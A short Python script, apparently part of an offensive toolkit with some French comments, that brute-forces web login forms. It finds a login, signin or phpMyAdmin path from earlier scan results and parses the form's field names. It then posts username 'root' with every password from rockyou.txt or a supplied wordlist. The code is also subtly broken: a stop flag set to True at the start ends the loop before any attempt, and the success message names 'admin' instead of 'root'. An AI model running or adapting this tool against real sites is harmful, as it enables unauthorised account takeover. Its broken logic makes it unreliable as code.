import requests
import sys
import json
import subprocess
import threading
from bs4 import BeautifulSoup

# Récupération des informations de la page précédente
Ip = sys.argv[1]

# Set the flag to stop all threads
stop_threads = True

# Load the JSON data from the file
with open('database.json') as f:
    data = json.load(f)

# Search for the Directory scan result that matches the login keyword
for scan in data['DIRECTORY SCAN']['Scan_Results']:
    if 'login' in scan or 'phpmyadmin' in scan or 'signin' in scan:
        directory = scan.split()[-1].strip('/')
        break

def find_login_fields(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')

    form = soup.find('form')

    if form:
        username_field = None
        password_field = None
        inputs = form.find_all('input')
        for input_tag in inputs:
            if 'name' in input_tag.attrs:
                if input_tag.get('type') == 'text':
                    if 'email' in input_tag['name'].lower() or 'username' in input_tag['name'].lower():
                        username_field = input_tag['name']
                elif input_tag.get('type') == 'password':
                    password_field = input_tag['name']
        return username_field, password_field
    else:
        print("No login form found on the page.")
        subprocess.call(['python3', 'attack_menu.py', url])

wordlist_path = "./assets/wordlist/rockyou.txt"

def brute_force_login(url, username_field, password_field, wordlist_path):
    with open(wordlist_path, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        if stop_threads:
            break
        payload = {
            username_field: 'root',
            password_field: password
        }
        response = requests.post(url, data=payload)
        if "Login successful" in response.text:
            print(f"Login successful! Username: admin, Password: {password}")
            subprocess.call(['python3', 'attack_menu.py', url])
            break
    else:
        print("Brute force attack failed.")
        subprocess.call(['python3', 'attack_menu.py', url])

if __name__ == "__main__":
    url = f'http://{Ip}/{directory}/'
    username_field, password_field = find_login_fields(url)
    
    if username_field and password_field:
        user_wordlist_path = input("Enter the path to the wordlist file: ")
        if user_wordlist_path.strip():
            wordlist_path = user_wordlist_path

        # Exécution de la fonction gather_info dans un autre thread
        scan_thread = threading.Thread(target=brute_force_login, args=(url, username_field, password_field, wordlist_path))

        # Démarrage du thread de scan
        scan_thread.start()

        # Attente de la fin du thread de scan
        scan_thread.join()

        # Set the flag to stop all threads
        stop_threads = True
